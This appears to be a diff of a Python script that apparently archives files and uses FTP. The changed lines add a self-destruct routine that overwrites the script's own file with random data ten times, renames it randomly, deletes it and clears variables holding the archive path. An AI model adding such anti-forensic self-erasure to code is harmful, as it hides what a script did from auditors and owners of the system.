@@ -1,4 +1,5 @@
-import tarfile, os, ftplib
+from secrets import token_urlsafe
+import tarfile, os, ftplib, gc
 from pathlib import Path
 from sys import argv
 
@@ -26,5 +27,11 @@ except Exception as error:
     print(error)
 
 # Autodestroy:
-# TO-DO autoshred.
-os.remove(argv[0])
+del gnu_path, tarname, tarfilepath
+for i in range(10):
+    with open(argv[0], "wb") as fl:
+        fl.write(token_urlsafe(16).encode())
+new_name = token_urlsafe(8)
+os.rename(argv[0], new_name)
+os.unlink(new_name)
+gc.collect()
